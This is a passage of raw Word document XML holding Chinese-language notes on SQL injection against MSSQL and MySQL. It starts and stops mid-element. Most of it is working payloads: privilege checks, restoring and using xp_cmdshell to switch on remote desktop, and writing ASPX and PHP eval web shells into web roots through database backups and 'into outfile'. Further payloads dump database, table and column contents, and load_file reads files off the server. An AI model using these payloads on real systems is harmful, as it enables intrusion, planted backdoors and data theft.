        <w:t>and 1=(select IS_SRVROLEMEMBER('sysadmin'))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断是否是系统管理员，若是可进行拓展存储注入攻击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and 1=(select IS_MEMBER('db_owner'))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断是否是库权限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and 1=(select IS_MEMBER('public'))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>判断是否为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>权限</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>拓展存储注入攻击：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>检查</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_cmdshell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>扩展存储：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=(select count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>检查</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_regread</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>扩展存储</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and 1=(select count(*) FROM master.dbo.sysobjects where name = 'xp_regread')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>若拓展存储被删除，可按照如下方式恢复：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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_cmdshell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：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master..sp_dropextendedproc 'xp_cmdshell'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创建</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_cmdshell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master..sp_addextendedproc xp_cmdshell,'xplog70.dll'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00071932">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>该语句利用系统中默认的“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xplog70.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”文件，自动恢复</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_cmdshell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。如果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xplog70.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>被删除或改名，可以上传一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>"xplog70.dll"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，自定义路径进行恢复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master..sp_addextendedproc 'xp_cmdshell','c:\xplog70.dll'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>权限下扩展存储攻击利用方法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xp_cmdshell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>扩展执行任意命令，如开启</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3389</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：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master..xp_cmdshell 'sc config termservice start=auto'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>;exec master..xp_cmdshell 'net start termservice'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:t>;exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'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xp_regwrite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>操作注册表与开启沙盒模式（可参照提权部分）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>DBowner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>权限下的扩展攻击利用：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>DBowner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>权限无法直接利用拓展存储执行系统命令进行攻击，通常先利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_dirtree</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>拓展存储列出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>目录；再利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句创建一个临时表，插入一句话木马到临时表中；然后利用数据库备份语句将数据库备份到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>目录并保存为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>asp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>格式的文件，即可得到一个一句话木马后门：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lastRenderedPageBreak/>
        <w:t>确认</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>DBowner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>权限：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="000D78D4" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:t>and 1=(select is_member('db_owner'));--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创建一个临时表：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:t>;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--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xp_dirtree</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>扩展查询</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>这里查询的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>盘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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>查询表中的内容：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>and(select dir from temp where id=1)&gt;0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不能一次性获取所有目录文件和文件名，所以需要修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4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写入一句话木马，并备份：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="000D78D4" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:t>;alter database cimer set RECOVERY FULL</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>;create table test(str image)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>;backup log cimer to disk='c:\test' with init</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000D78D4">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:t>;insert into test(str)values ('&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["test"],"unsafe");%&gt;')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="000D78D4" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:t>;backup log cimer to disk='c:\inetpub\wwwroot\cimer.aspx'</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="000D78D4" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="000D78D4">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>手动暴库办法</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002C7481" w:rsidRDefault="002C7481" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获取</w:t>
      </w:r>
      <w:r>
        <w:t>当前用户名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002C7481" w:rsidRPr="002C7481" w:rsidRDefault="002C7481" w:rsidP="002C7481">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r w:rsidRPr="002C7481">
        <w:t>union select null, null, user, null from master..sysdatabases</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆所有数据库名（修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>dbid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值）：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and 1=(select name from master.dbo.sysdatabases where dbid=1)--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆出当前数据库中的所有表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>增加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数字值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912F6A" w:rsidRDefault="00912F6A" w:rsidP="005275C7">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and (select top 1 name from (select top n name from sysobjects where xtype=0x75 order by name) t order by name desc)=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>跨库查询其他数据库的表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>增加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数字值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912F6A" w:rsidRDefault="00912F6A" w:rsidP="005275C7">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">and (select top 1 name from (select top n name from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>..sysobjects where xtype=0x75 order by name) t order by name desc)=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>爆字段名和字段值：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="005275C7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增加数字</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值，就可以得到表中所有字段</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="005275C7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and (select col_name(object_id(</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>‘表名</w:t>
      </w:r>
      <w:r w:rsidR="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>'),n))=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="005275C7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获取字段内容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and (select top 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)&gt;0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爆其他字段值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and (select top 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>&lt;&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>字段值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1)&gt;0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D47A9" w:rsidRPr="002D47A9" w:rsidRDefault="002D47A9" w:rsidP="002D47A9">
      <w:r>
        <w:tab/>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="009A7505">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>不区分大小写</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>常见注入方式</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CF7040">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>首先，利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>order by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获得字段数，再使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>union select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>查询获取想要的数据库信息（见下文——手动注入）。可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>load_file()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数读取服务器上的文件。如果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>服务器和数据库服务器没有分离，找到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>路径之后还可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select into outfile()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数将一句话木马导出到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>目录。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load_file()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and 1=2 union select 1,load_file('c:\\boot.ini'),3,4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and 1=2 union select 1,load_file(0x633A5C626F6F742E696E69),3,4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>select '&lt;?php eval($_REQUEST[yzj]);?&gt;' into outfile 'C:/PHPnow-1.5.6/fff.php';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00CF7040" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00CF7040">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
